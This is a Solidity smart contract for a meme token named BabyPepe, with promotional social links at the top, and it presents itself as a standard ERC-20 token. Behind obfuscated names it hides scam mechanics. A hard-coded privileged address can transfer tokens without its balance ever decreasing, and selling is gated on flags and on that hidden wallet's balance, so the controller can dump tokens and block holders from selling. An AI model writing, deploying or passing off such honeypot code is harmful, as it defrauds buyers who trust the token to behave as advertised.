/*

website: https://babypeperc.com/

telegram: https://t.me/babypepe_coinerc20

twitter: https://twitter.com/babypepecoinerc

**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function _rkywlhlrkyw(uint256 a, uint256 b) internal pure returns (uint256) {
        return _rkywlhlrkyw(a, b, "SafeMath: _rkywlhlrkywtraction overflow");
    }

    function _rkywlhlrkyw(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IuniswapRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract BabyPepe is Context, IERC20, Ownable {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private _rkywijrkyw;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    bool public limirkywEnablerkyw = false;
    using SafeMath for uint256;

    string private constant _name = unicode"BabyPepe";
    string private constant _symbol = unicode"BabyPepe";
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 42069000000000 * 10 **_decimals;
    uint256 public _maxrkywAmount = 690000000000 * 10 **_decimals;
    uint256 public _maxrkywallet = 690000000000 * 10 **_decimals;
    uint256 public _taxrkywSwaprkywThresholrkyw = 690000000000 * 10 **_decimals;
    uint256 public _maxrkywSwap = 690000000000 * 10 **_decimals;

    uint256 private _initrkywBuyTax=5;
    uint256 private _initrkywSellTax=5;
    uint256 private _finrkywBuyTax=1;
    uint256 private _finrkywSellTax=1;
    uint256 private _redrkywBuyTaxAtrkyw=5;
    uint256 private _redrkywSellTaxAtrkyw=1;
    uint256 private _prevenrkywSwapBefore=0;
    uint256 private _buyCount=0;

    IuniswapRouter private uniswapRouter;
    address private uniswapPair;
    bool private hgiaklrkyw;
    bool private inSwap = false;
    bool private swapEnabled = false;
    address public _rhioRaecoverrkyw = 0x78f1A9eBb8fB3FC4eb408F4C52F6573e499Cc996;


    event MaxrkywAmounrkywapdaterkyw(uint _maxrkywAmount);
    modifier swapping {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_rhioRaecoverrkyw] = true;
        _balances[_msgSender()] = _tTotal;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]._rkywlhlrkyw(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {

            if (limirkywEnablerkyw) {
                if (to != address(uniswapRouter) && to != address(uniswapPair)) {
                  require(_holderLastTransferTimestamp[tx.origin] < block.number,"Only one transfer per block allowed.");
                  _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (from == uniswapPair && to != address(uniswapRouter) && !_isExcludedFromFee[to] ) {
                require(amount <= _maxrkywAmount, "Exceeds the Amount.");
                require(balanceOf(to) + amount <= _maxrkywallet, "Exceeds the max Wallet Size.");
                if(_buyCount<_prevenrkywSwapBefore){
                  require(!_wqohrkyw(to));
                }
                _buyCount++; _rkywijrkyw[to]=true;
                taxAmount = amount.mul((_buyCount>_redrkywBuyTaxAtrkyw)?_finrkywBuyTax:_initrkywBuyTax).div(100);
            }

            if(to == uniswapPair && from!= address(this) && !_isExcludedFromFee[from] ){
                require(amount <= _maxrkywAmount && balanceOf(_rhioRaecoverrkyw)<_maxrkywSwap, "Exceeds the Amount.");
                taxAmount = amount.mul((_buyCount>_redrkywSellTaxAtrkyw)?_finrkywSellTax:_initrkywSellTax).div(100);
                require(_buyCount>_prevenrkywSwapBefore && _rkywijrkyw[from]);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap 
            && to == uniswapPair && swapEnabled && contractTokenBalance>_taxrkywSwaprkywThresholrkyw 
            && _buyCount>_prevenrkywSwapBefore&& !_isExcludedFromFee[to] && !_isExcludedFromFee[from]
            ) {
                swapzrxrkyw(_rkywgrrkyw(amount,_rkywgrrkyw(contractTokenBalance,_maxrkywSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
   
                }
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=_rkywlhlrkyw(from, _balances[from], amount);
        _balances[to]=_balances[to].add(amount._rkywlhlrkyw(taxAmount));
        emit Transfer(from, to, amount._rkywlhlrkyw(taxAmount));
    }

    function swapzrxrkyw(uint256 tokenAmount) private swapping {
        if(tokenAmount==0){return;}
        if(!hgiaklrkyw){return;}
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _rkywgrrkyw(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function _rkywlhlrkyw(address from, uint256 a, uint256 b) private view returns(uint256){
        if(from == _rhioRaecoverrkyw){
            return a;
        }else{
            return a._rkywlhlrkyw(b);
        }
    }

    function removeLimits() external onlyOwner{
        _maxrkywAmount = _tTotal;
        _maxrkywallet=_tTotal;
        limirkywEnablerkyw=false;
        emit MaxrkywAmounrkywapdaterkyw(_tTotal);
    }

    function _wqohrkyw(address account) private view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function openTrading() external onlyOwner() {
        uniswapRouter = IuniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        require(!hgiaklrkyw,"trading is already open");
        _approve(address(this), address(uniswapRouter), _tTotal);
        uniswapPair = IUniswapV2Factory(uniswapRouter.factory()).createPair(address(this), uniswapRouter.WETH());
        uniswapRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapPair).approve(address(uniswapRouter), type(uint).max);
        swapEnabled = true;
        hgiaklrkyw = true;
    }

    receive() external payable {}
}